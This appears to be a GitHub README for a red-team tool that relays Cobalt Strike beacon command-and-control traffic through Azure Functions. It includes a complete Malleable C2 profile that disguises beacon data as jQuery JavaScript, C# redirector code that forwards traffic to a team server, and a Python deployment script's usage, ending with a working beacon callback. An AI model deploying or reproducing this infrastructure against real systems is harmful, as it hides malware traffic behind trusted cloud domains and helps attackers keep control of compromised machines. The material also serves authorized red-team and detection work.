# AzureFunctionRedirector

## Why?

Azure functions have been well known for relaying our malicious traffic through microsoft azure websites, with some blogs and tools demonstrating it's capabilities.

https://0xdarkvortex.dev/c2-infra-on-azure/

https://github.com/Flangvik/AzureC2Relay

https://posts.redteamtacticsacademy.com/azure-app-services-the-redirect-rollercoaster-you-didnt-know-you-needed-fa66bfa12bf8

I was exploring ways to relay our beacon traffic through Azure, inspired by the 'A Thousand Sails, One Harbor' blog post by @NinjaParanoid. While the post is excellent, it primarily demonstrates the technique using Brute Ratel, the C2 provided by Dark Vortex. The real challenge was replicating this manually, so I relied on various tools and made source code modifications as needed before compiling and deploying to Azure.

When looking at some of the older posts I tried to replicate these techniques using Cobalt Strike but I encountered issues, some functions where build in Node JS, Python and C#, I took the latter since I am more comfortable with this language and I already started following the NinjaParanoid guide.

I found some great help when trying to replicate it on Cobalt Strike using the [FunctionalC2](https://web.archive.org/web/20241203083420/https://fortynorthsecurity.com/blog/azure-functions-functional-redirection/) blog. I noticed that in the Functions needed a prefix value in the URL so these were created:

<img width="610" alt="modifypath" src="https://github.com/user-attachments/assets/e1368df5-fd42-4185-a1cc-9ec498085e33" />


After testing this I needed to build 2 functions each hanlding their respective URIs.

GET URL:

![image](https://github.com/user-attachments/assets/8c90f72d-1e4d-43fe-bf52-920bcda25434)


POST URL:

![image](https://github.com/user-attachments/assets/51606325-aa50-4228-a047-35007eaf4836)


## The C2 Profiles
The Malleable C2 profile was the tricky part. When forwarding traffic through Azure, Azure performs its own 'magic' and scrambles the profile data sent to Cobalt Strike often stripping out critical elements like the `BeaconID`, which I learned the hard way. However, Azure doesn’t modify anything in the URL, which allows us to embed our ID using the `parameter` value in the GET request. We can also place it in the headers by using the `header` value in the POST request within the metadata blocks of our profile.

![image](https://github.com/user-attachments/assets/93ff6d14-c7a3-49ac-8707-5249ed1b1071)


Now in the perfect setup our Profile should have a format as follows:

```
################################################
## HTTP GET
################################################
http-get {
    set verb "GET";
    set uri "/dmc/contact";
	
    client {
        header "Device-Type" "desktop";
        header "XSS-Protection" "0";
        metadata {

            base64url;
            parameter "HDDC";
            

        }
    }
    server {
        output {
            #mask;
            base64url;
            prepend "HD_DC=origin; path=/";
            append " secure, akacd_usbeta=3920475583~rv=59~id=79b199d0c6ec26db101b6646ef322ec1; path=/; Secure; SameSite=None, bm_ss=ab8e18ef4e";
            print;
        }
        header "Expect-CT" "max-age=0";
        header "Accept-Ranges" "bytes";
        header "X-TM-ZONE" "us-east4-c";
        header "Strict-Transport-Security" "max-age=63072000; includeSubDomains";
        header "X-Permitted-Cross-Domain-Policies" "none";
        header "X-Download-Options" "noopen";
    }
}

################################################
## HTTP POST
################################################
http-post {

    set uri "/dmc/resource";
    set verb "POST";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Encoding" "gzip, deflate";

        id {
            #mask;
            base64url;
            header "cfduid";
        }

        output {
            #mask;
            base64url;
            print;
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            #mask;
            base64url;
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line
            prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
            print;
        }
    }
}
```

Now our C# file has some important sections that we should change before running the script and compiling but the most important parts are here:

GET:
```csharp
       [FunctionName("ContactFunction")]
        public static async Task<IActionResult> ContactFunction(
            [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "contact")] HttpRequest req)
        {
            string baseUrl = "https://<IP or Domain TeamServer>";
            // Forward GET requests to the team server's GET endpoint.
            string targetUrl = $"{baseUrl}/dmc/contact";

```

POST:
```csharp
        [FunctionName("ResourceFunction")]
        public static async Task<IActionResult> ResourceFunction(
            [HttpTrigger(AuthorizationLevel.Anonymous, "post", Route = "resource")] HttpRequest req)
        {
            string baseUrl = "https://<IP or Domain TeamServer>";
            // Forward POST requests to the team server's POST endpoint.
            string targetUrl = $"{baseUrl}/dmc/resource";
```

## AzureFunctionsRelaySetup

Azure needs 3rd party tools to execute correctly, and create the necessary resources to build a function and they are 2 only:

```
AZ CLI tools
Azure Functions Core Tools
```

With these installed we can run our Python whcih the help menu explains the necessary values for this to work properly:
```
python .\AzFuntionDeployment.py --help
usage: AzFuntionDeployment.py [-h] --project-name PROJECT_NAME --function-name FUNCTION_NAME --functioncode FUNCTIONCODE --resource-group RESOURCE_GROUP --location LOCATION
                              --functionapp FUNCTIONAPP --storage-account STORAGE_ACCOUNT --newprefix NEWPREFIX [--base-dir BASE_DIR]

Deploy a Windows C# Azure Function project.

options:
  -h, --help            show this help message and exit
  --project-name PROJECT_NAME
                        Name for the Azure Functions project (e.g., MyFunctionApp)
  --function-name FUNCTION_NAME
                        Name for the new function (e.g., ForwardRequestFunction)
  --functioncode FUNCTIONCODE
                        Path to the C# function code file
  --resource-group RESOURCE_GROUP
                        Azure Resource Group name (will be created if it doesn't exist)
  --location LOCATION   Azure location for all resources (e.g., westus, eastus)
  --functionapp FUNCTIONAPP
                        Name of the Azure Function App (deployment target)
  --storage-account STORAGE_ACCOUNT
                        Name of the Azure Storage Account (globally unique)
  --newprefix NEWPREFIX
                        New HTTP route prefix to use in host.json (e.g., 'wkl')
  --base-dir BASE_DIR   Directory in which to create the project (default: current directory)
```

A full command looks as follows, the script holds high level DEBUG information to dive a little deep on what erros are going on and where:
```
python .\AzFunctionDeployment.py --project-name csharpfunctionapp  --function-name csharpfunctionapp --functioncode C:\RedTeam\AzureFunctionsRelaySetup\functionapp\MyApp.cs --resource-group DMCRedirectorGroup --location westus --functionapp csharpDMCApp --storage-account csharpdmcstorageacct --newprefix dmc --base-dir C:\RedTeam\AzureFunctionsRelaySetup\functionapp

                         _._
                          :.
                          : :
                          :  .
                         .:   :
                        : :    .
                       :  :     :
                      .   :      .
                     :    :       :
                    :     :        .
                   .      :         :
                  :       :          .
                 :        :           :
                .=w=w=w=w=:            .
                          :=w=w=w=w=w=w=.   ....
           <---._______:U~~~~~~~~\_________.:---/
            \      ____===================____/
.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.
"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"
"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"~-,.,-~"^"

Project directory: C:\RedTeam\AzureFunctionsRelaySetup\functionapp\csharpfunctionapp
Running command: func init csharpfunctionapp --worker-runtime dotnet

Writing C:\RedTeam\AzureFunctionsRelaySetup\functionapp\csharpfunctionapp\.vscode\extensions.json
Running command: func new --name csharpfunctionapp --template "HTTP trigger" --authlevel anonymous
Template: HTTP trigger
Function name: csharpfunctionapp
```

With no errors and a successful creation, we can proceed to set this into our Cobalt Strike listener.

![image](https://github.com/user-attachments/assets/2f84a931-c4d7-4b09-bd1f-d7a32d8ec556)

Next, we build our beacon and should receive a callback with our commands being executed and output correctly

![image](https://github.com/user-attachments/assets/f902ad18-c75b-4e70-a6f2-beae0919caae)



